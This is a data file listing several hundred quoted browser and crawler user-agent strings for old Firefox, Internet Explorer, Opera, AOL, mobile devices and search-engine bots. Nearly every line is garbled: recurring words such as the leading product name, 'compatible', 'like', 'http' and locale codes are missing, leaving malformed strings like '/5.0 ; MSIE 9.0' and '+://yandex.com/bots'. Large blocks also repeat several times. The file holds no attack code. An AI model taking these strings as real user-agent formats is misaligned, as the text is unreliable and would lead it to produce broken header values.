	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.7 Gecko/20100809 /3.6.7-1.fc14 Firefox/3.6.7"
	"/5.0 ; /2.1; +://.com/.html"
	"/5.0 ; Yahoo! ; ://.yahoo.com//us/ysearch/"
	"YahooSeeker/1.2 ;  4.0; MSIE 5.5; yahooseeker  yahoo-inc  com ; ://.yahoo.com//us///"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0"
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; .NET CLR 2.0.50727; InfoPath.2"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US"
	"/4.0 ; MSIE 6.1; Windows XP"
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"
	"-; +://.com/; : webetrex"
	"/5.0 ; MSIE 9.0; AOL 9.7;  4343.19; Windows NT 6.1; WOW64; /5.0; FunWebProducts"
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.27; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729"
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.21; Windows NT 5.1; /4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E"
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729"
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E"
	"/4.0 ; MSIE 7.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/5.0 Windows; U; Windows NT 5.2; -; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1 .NET CLR 3.0.04506.648"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2"
	"/9.60 J2ME/MIDP;  Mini/4.2.14912/812; U;  Presto/2.4.15"
	"/5.0 Macintosh; U; PPC Mac OS X; -US /125.4 KHTML,  Gecko, Safari OmniWeb/v563.57"
	"/5.0 SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; /MIDP-2.0 /CLDC-1.1  /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0"
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.0.5 Gecko/20060706 K-/1.0"
	"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/"
	"/4.76 [] PalmOS; U; WebPro/; Palm-Arz1"
	"/5.0 Macintosh; U; PPC Mac OS X; - /418 KHTML,  Gecko /1.2.2 Safari/125"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.6 Gecko/2007072300 Iceweasel/2.0.0.6 -2.0.0.6-0etch1+lenny1"
	"/5.0 SymbianOS/9.1; U; -us /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 6.1; Windows NT 5.1; /4.0; SV1; .NET CLR 3.5.30729; InfoPath.2"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US"
	"Links 2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25"
	"/4.0 ; MSIE 6.0; Windows NT 5.0; WOW64; /4.0; SLCC1"
	"/1.22 ; Konqueror/4.3; Linux KHTML/4.3.5  Gecko"
	"/4.0 ; MSIE 6.0; Windows CE;  6.5"
	"/9.80 Macintosh; U; - Presto/2.8.131 /11.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100318 /2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
	"/4.0 ; MSIE 6.1; Windows XP Gecko/20060706 /7.0"
	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10"
	"/5.0 Macintosh; I; Intel Mac OS X 10_6_7; -"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0"
	"/1.22 ; MSIE 6.0; Windows NT 6.1; /4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3"
	"/5.0 ; /3.0; +://yandex.com/bots"
	"/4.0 Macintosh; U; Intel Mac OS X 10_6_7; -US /534.16 KHTML,  Gecko /10.0.648.205 Safari/534.16"
	"/1.22 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1"
	"/5.0 ; MSIE 2.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2"
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"
	"/5.0 ; MSIE 2.0; Windows CE;  7.0"
	"/4.0 Macintosh; U; PPC Mac OS X; -US"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7"
	"BlackBerry8300/4.2.2 /MIDP-2.0 /CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0"
	"/1.22 ; MSIE 2.0; Windows 3.1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;  Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322"
	"/3.0 Windows NT 6.1; -; rv:1.9.1.3. Win32; x86 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/7.0 ; MSIE 2.0; Windows 3.1"
	"/9.80 Windows NT 5.1; U; -US Presto/2.8.131 /11.10"
	"/4.0 ; MSIE 6.0;   Browser 1.1; rev1.5; Windows NT 5.1;"
	"/5.0 Windows; U; Windows CE 4.21; rv:1.8b4 Gecko/20050720 Minimo/0.007"
	"BlackBerry9000/5.0.0.93 /MIDP-2.0 /CLDC-1.1 VendorID/179"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/5.0 Windows; U; Windows NT 5.2; -; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1 .NET CLR 3.0.04506.648"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2"
	"/9.60 J2ME/MIDP;  Mini/4.2.14912/812; U;  Presto/2.4.15"
	"/5.0 Macintosh; U; PPC Mac OS X; -US /125.4 KHTML,  Gecko, Safari OmniWeb/v563.57"
	"/5.0 SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; /MIDP-2.0 /CLDC-1.1  /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0"
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.0.5 Gecko/20060706 K-/1.0"
	"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/"
	"/4.76 [] PalmOS; U; WebPro/; Palm-Arz1"
	"/5.0 Macintosh; U; PPC Mac OS X; - /418 KHTML,  Gecko /1.2.2 Safari/125"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.6 Gecko/2007072300 Iceweasel/2.0.0.6 -2.0.0.6-0etch1+lenny1"
	"/5.0 SymbianOS/9.1; U; -us /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 6.1; Windows NT 5.1; /4.0; SV1; .NET CLR 3.5.30729; InfoPath.2"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US"
	"Links 2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25"
	"/4.0 ; MSIE 6.0; Windows NT 5.0; WOW64; /4.0; SLCC1"
	"/1.22 ; Konqueror/4.3; Linux KHTML/4.3.5  Gecko"
	"/4.0 ; MSIE 6.0; Windows CE;  6.5"
	"/9.80 Macintosh; U; - Presto/2.8.131 /11.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100318 /2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
	"/4.0 ; MSIE 6.1; Windows XP Gecko/20060706 /7.0"
	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10"
	"/5.0 Macintosh; I; Intel Mac OS X 10_6_7; -"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0"
	"/1.22 ; MSIE 6.0; Windows NT 6.1; /4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3"
	"/5.0 ; /3.0; +://yandex.com/bots"
	"/4.0 Macintosh; U; Intel Mac OS X 10_6_7; -US /534.16 KHTML,  Gecko /10.0.648.205 Safari/534.16"
	"/1.22 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1"
	"/5.0 ; MSIE 2.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2"
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"
	"/5.0 ; MSIE 2.0; Windows CE;  7.0"
	"/4.0 Macintosh; U; PPC Mac OS X; -US"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7"
	"BlackBerry8300/4.2.2 /MIDP-2.0 /CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0"
	"/1.22 ; MSIE 2.0; Windows 3.1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;  Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322"
	"/3.0 Windows NT 6.1; -; rv:1.9.1.3. Win32; x86 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/7.0 ; MSIE 2.0; Windows 3.1"
	"/9.80 Windows NT 5.1; U; -US Presto/2.8.131 /11.10"
	"/4.0 ; MSIE 6.0;   Browser 1.1; rev1.5; Windows NT 5.1;"
	"/5.0 Windows; U; Windows CE 4.21; rv:1.8b4 Gecko/20050720 Minimo/0.007"
	"BlackBerry9000/5.0.0.93 /MIDP-2.0 /CLDC-1.1 VendorID/179"
	"/5.0 ; 008/0.83; ://www.80legs.com/webcrawler.html Gecko/2008032620"
	"/4.0 ; MSIE 7.0; Windows NT 6.0  www.idealobserver.com"
	"/5.0 ; /1.0; +://www.anyapex.com/.html"
	"/4.0 ; Arachmo"
	"/4.0 ; B-l-i--z-B-O-T"
	"/5.0 ; Baiduspider/2.0; +://.com/search/spider.html"
	"/5.0 ; Baiduspider/2.0; +://.com/search/spider.html"
	"/5.0 ; /2.3; MSIE 6.0 ; +://.com/site_owners.html"
	"/1.0 +://.com/crawler/"
	"/5.0 ; /2.0; +://.com/.htm"
	"Sqworm/2.9.85-BETA beta_release; 20011115-775; i686-pc-linux-"
	"/5.0 ; YandexImages/3.0; +://yandex.com/bots"
	"/5.0 ; Yahoo! ; ://.yahoo.com//us/ysearch/"
	"/5.0 ; /1.0; ://www.yodao.com//webmaster/spider/; "
	"/5.0 ; /1.0; ://www.yodao.com//webmaster/spider/; "
	"/4.0  /1.0  Link Checker @; ://.com"
	"/4.0  /1.0  Link Checker .dlc@; ://.com"
	"/4.0  /1.0 -@; ://.com"
	"/5.0 ; U;  0.6;  /420+ KHTML,  Gecko"
	"/5.0 ; MSIE 8.0; Windows NT 6.0; /4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729;  Browser"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; Acoo Browser; GTB6; /4.0 ; MSIE 6.0; Windows NT 5.1; SV1 ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727"
	"/5.0 Macintosh; U; PPC Mac OS X;  /419 KHTML,  Gecko, Safari/419.3 /1.0.ALPHA"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.2 KHTML,  Gecko ChromePlus/4.0.222.3 /4.0.222.3 Safari/532.2"
	"/5.0 Windows; U; Windows NT 6.1; -US /534.10 KHTML,  Gecko /8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1"
	"Links 2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; "
	"/5.0 Macintosh; Intel Mac OS X 10_9_3 /537.75.14 KHTML,  Gecko /7.0.3 Safari/7046A194A"
	"/5.0 PLAYSTATION 3; 3.55"
	"/5.0 PLAYSTATION 3; 2.00"
	"/5.0 PLAYSTATION 3; 1.00"
	"/5.0 Windows NT 6.3; WOW64; rv:24.0 Gecko/20100101 /24.4.0"
	"/5.0 ; /1.0; +://www.abilogic.com/.html"
	"SiteBar/3.3.8 Bookmark Server; :///"
	"iTunes/9.0.3 Macintosh; U; Intel Mac OS X 10_6_2; -"
	"iTunes/9.0.3 Macintosh; U; Intel Mac OS X 10_6_2; -"
	"/4.0 ;  3.0; Macintosh"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3 FM  4.6.1"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3 .NET CLR 3.5.30729 Prevx 3.0.5 "
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.8 Gecko/20071004 Iceweasel/2.0.0.8 -2.0.0.6+2.0.0.8-Oetch1"
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.8.0.1 Gecko/20060111 Firefox/1.5.0.1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07}"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=;  DSL 1.1; "
	"/4.0 ; MSIE 5.5; Windows 98"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;   8.51"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.8.0.1 Gecko/20060111 Firefox/1.5.0.1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600# Pack 1#2#5#154321|"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1;  Toolbar; ; .NET CLR 1.1.4322"
	"/5.0 Macintosh; U; PPC Mac OS X; - /417.9 KHTML,  Gecko Safari/417.8"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.12 Gecko/20051010 Firefox/1.0.7   1.0.7"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0"
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; .NET CLR 2.0.50727; InfoPath.2"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US"
	"/4.0 ; MSIE 6.1; Windows XP"
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/5.0 Windows; U; Windows NT 5.2; -; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1 .NET CLR 3.0.04506.648"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2"
	"/9.60 J2ME/MIDP;  Mini/4.2.14912/812; U;  Presto/2.4.15"
	"/5.0 Macintosh; U; PPC Mac OS X; -US /125.4 KHTML,  Gecko, Safari OmniWeb/v563.57"
	"/5.0 SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; /MIDP-2.0 /CLDC-1.1  /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0"
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.0.5 Gecko/20060706 K-/1.0"
	"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/"
	"/4.76 [] PalmOS; U; WebPro/; Palm-Arz1"
	"/5.0 Macintosh; U; PPC Mac OS X; - /418 KHTML,  Gecko /1.2.2 Safari/125"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.6 Gecko/2007072300 Iceweasel/2.0.0.6 -2.0.0.6-0etch1+lenny1"
	"/5.0 SymbianOS/9.1; U; -us /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 6.1; Windows NT 5.1; /4.0; SV1; .NET CLR 3.5.30729; InfoPath.2"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US"
	"Links 2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25"
	"/4.0 ; MSIE 6.0; Windows NT 5.0; WOW64; /4.0; SLCC1"
	"/1.22 ; Konqueror/4.3; Linux KHTML/4.3.5  Gecko"
	"/4.0 ; MSIE 6.0; Windows CE;  6.5"
	"/9.80 Macintosh; U; - Presto/2.8.131 /11.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100318 /2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
	"/4.0 ; MSIE 6.1; Windows XP Gecko/20060706 /7.0"
	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10"
	"/5.0 Macintosh; I; Intel Mac OS X 10_6_7; -"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0"
	"/1.22 ; MSIE 6.0; Windows NT 6.1; /4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3"
	"/5.0 ; /3.0; +://yandex.com/bots"
	"/4.0 Macintosh; U; Intel Mac OS X 10_6_7; -US /534.16 KHTML,  Gecko /10.0.648.205 Safari/534.16"
	"/1.22 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1"
	"/5.0 ; MSIE 2.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2"
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"
	"/5.0 ; MSIE 2.0; Windows CE;  7.0"
	"/4.0 Macintosh; U; PPC Mac OS X; -US"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7"
	"BlackBerry8300/4.2.2 /MIDP-2.0 /CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0"
	"/1.22 ; MSIE 2.0; Windows 3.1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;  Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322"
	"/3.0 Windows NT 6.1; -; rv:1.9.1.3. Win32; x86 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/7.0 ; MSIE 2.0; Windows 3.1"
	"/9.80 Windows NT 5.1; U; -US Presto/2.8.131 /11.10"
	"/4.0 ; MSIE 6.0;   Browser 1.1; rev1.5; Windows NT 5.1;"
	"/5.0 Windows; U; Windows CE 4.21; rv:1.8b4 Gecko/20050720 Minimo/0.007"
	"BlackBerry9000/5.0.0.93 /MIDP-2.0 /CLDC-1.1 VendorID/179"
	"/4.0 ; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322"
	"/2.1 ://.com/.html"
	"/9.20 Windows NT 6.0; U; "
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.1 Gecko/20061205 Iceweasel/2.0.0.1 -2.0.0.1+-2"
	"/4.0 ; MSIE 7.0; Windows NT 5.1; /4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322"
	"/10.00 X11; Linux i686; U;  Presto/2.2.0"
	"/5.0 Windows; U; Windows NT 6.0; -IL /528.16 KHTML,  Gecko /4.0 Safari/528.16"
	"/5.0 ; Yahoo! /3.0; ://.yahoo.com//us/ysearch/"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.13 Gecko/20101209 Firefox/3.6.13"
	"/4.0 ; MSIE 9.0; Windows NT 5.1; /5.0"
	"/5.0 ; MSIE 8.0; Windows NT 5.1; /4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727"
	"/4.0 ; MSIE 7.0b; Windows NT 6.0"
	"/4.0 ; MSIE 6.0b; Windows 98"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/4.0 .NET CLR 3.5.30729"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.8 Gecko/20100804 Gentoo Firefox/3.6.8"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.7 Gecko/20100809 /3.6.7-1.fc14 Firefox/3.6.7"
	"/5.0 ; /2.1; +://.com/.html"
	"/5.0 ; Yahoo! ; ://.yahoo.com//us/ysearch/"
	"YahooSeeker/1.2 ;  4.0; MSIE 5.5; yahooseeker  yahoo-inc  com ; ://.yahoo.com//us///"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0"
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; .NET CLR 2.0.50727; InfoPath.2"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US"
	"/4.0 ; MSIE 6.1; Windows XP"
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"
	"-; +://.com/; : webetrex"
	"/5.0 ; MSIE 9.0; AOL 9.7;  4343.19; Windows NT 6.1; WOW64; /5.0; FunWebProducts"
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.27; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729"
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.21; Windows NT 5.1; /4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E"
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729"
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E"
	"/4.0 ; MSIE 7.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/5.0 Windows; U; Windows NT 5.2; -; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1 .NET CLR 3.0.04506.648"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E"
